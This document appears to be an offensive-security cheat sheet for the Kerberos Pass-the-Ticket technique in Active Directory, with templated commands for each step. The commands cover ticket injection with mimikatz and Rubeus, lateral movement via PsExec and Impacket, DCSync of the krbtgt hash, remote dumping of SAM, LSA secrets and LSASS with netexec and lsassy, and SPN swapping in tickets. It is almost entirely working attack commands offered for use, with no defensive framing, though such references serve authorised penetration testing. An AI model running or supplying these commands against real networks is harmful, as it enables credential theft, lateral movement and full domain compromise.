---
technique: Pass the Ticket
category: kerberos
targets: Services, Domain Controllers
protocols: Kerberos
remote_capable: true
tags: kerberos pass-the-ticket ptt ccache kirbi ticket-injection lateral-movement ad
---

# Pass the Ticket

Kerberos tickets (TGTs or STs) obtained through dumping, forging, or requests can be injected into a session and used to authenticate to services without knowing any password. On Windows, tickets are injected into memory and used natively. On Linux, the path to a `.ccache` file is exported in `KRB5CCNAME` and picked up by tools supporting Kerberos.

## Windows

### mimikatz

#c #ticket-injection #kirbi

Inject a `.kirbi` or `.ccache` ticket into the current Windows session with mimikatz.

```cmd title:"Inject Kerberos ticket into session via mimikatz"
kerberos::ptt "$ticket_file"
```
<!-- cheat
var ticket_file
-->

### Rubeus

#powershell #ticket-injection

Inject a base64-encoded or file-based ticket into the current session with Rubeus.

```powershell title:"Inject ticket into session with Rubeus ptt"
.\Rubeus.exe ptt /ticket:"$ticket_b64_or_file"
```
<!-- cheat
var ticket_b64_or_file
-->

### PsExec (after injection)

#cmd #lateral-movement

Use an injected Kerberos ticket for lateral movement with PsExec.

```cmd title:"Lateral movement via PsExec using injected Kerberos ticket"
.\PsExec.exe -accepteula \\$target cmd
```
<!-- cheat
var target
-->

### mimikatz (DCSync via ticket)

#c #dcsync #post-exploitation

Use an injected ticket to DCSync the krbtgt hash.

```cmd title:"DCSync krbtgt hash using injected Kerberos ticket"
lsadump::dcsync /dc:$dc_fqdn /domain:$domain /user:krbtgt
```
<!-- cheat
import domain_ip
var dc_fqdn
-->

## Linux

### KRB5CCNAME export

#bash #ccache #ticket-reference

Reference a `.ccache` ticket file in the environment variable so Kerberos-aware tools pick it up.

```sh title:"Export ccache path for use by Kerberos-aware tools"
export KRB5CCNAME="$ccache_file"
```
<!-- cheat
var ccache_file
-->

### ticketConverter.py

#impacket #conversion

Convert tickets between Windows `.kirbi` and Linux `.ccache` format.

```sh title:"Convert between kirbi and ccache ticket formats"
ticketConverter.py "$src_ticket" "$dst_ticket"
```
<!-- cheat
var src_ticket
var dst_ticket
-->

### secretsdump (via ticket)

#impacket #credential-dumping

Dump credentials remotely using a Kerberos ticket instead of a password.

```sh title:"Dump credentials remotely with Kerberos ticket"
secretsdump.py -k -no-pass "$domain/$user@$target"
```
<!-- cheat
import domain_ip
import users
var target
-->

### netexec SAM dump (via ticket)

#smb #credential-dumping

Dump local SAM hashes over SMB using a cached Kerberos ticket.

```sh title:"Dump SAM hashes via Kerberos ticket with netexec"
nxc smb "$targets" -k --sam
```
<!-- cheat
var targets
-->

### netexec LSA dump (via ticket)

#smb #credential-dumping

Dump LSA secrets over SMB using a cached Kerberos ticket.

```sh title:"Dump LSA secrets via Kerberos ticket with netexec"
nxc smb "$targets" -k --lsa
```
<!-- cheat
var targets
-->

### netexec command execution (via ticket)

#smb #lateral-movement

Execute commands or dump credentials on multiple targets using a cached Kerberos ticket.

```sh title:"SMB command execution via Kerberos ticket with netexec"
nxc smb "$targets" -k -x whoami
```
<!-- cheat
var targets
-->

### netexec lsassy module (via ticket)

#smb #lsass #credential-dumping

Dump LSASS remotely through the NetExec lsassy module using a cached Kerberos ticket.

```sh title:"Dump LSASS via Kerberos ticket with netexec lsassy"
nxc smb "$targets" -k -M lsassy
```
<!-- cheat
var targets
-->

### lsassy (via ticket)

#python #lsass #credential-dumping

Dump LSASS remotely with standalone lsassy using a cached Kerberos ticket.

```sh title:"Dump LSASS via Kerberos ticket with lsassy"
lsassy -k "$targets"
```
<!-- cheat
var targets
-->

### Impacket exec (via ticket)

#impacket #lateral-movement

Execute commands on a target using a Kerberos ticket with various Impacket exec scripts.

```sh title:"Remote execution via Kerberos ticket with Impacket"
psexec.py -k -no-pass "$domain/$user@$target"
```
<!-- cheat
import domain_ip
import users
var target
-->

### tgssub (SPN modification)

#impacket #spn-swap

Modify the service class or hostname in a ticket's `sname` field to access a different service.

```sh title:"Swap SPN in ticket to access a different service class"
tgssub.py -in ticket.ccache -out newticket.ccache -altservice "cifs/$target"
```
<!-- cheat
var target
-->

### Rubeus tgssub (SPN modification)

#powershell #spn-swap

Modify the SPN in a ticket on Windows using Rubeus tgssub.

```powershell title:"Swap SPN in ticket with Rubeus tgssub"
.\Rubeus.exe tgssub /altservice:cifs /ticket:"$ticket_b64_or_file"
```
<!-- cheat
var ticket_b64_or_file
-->
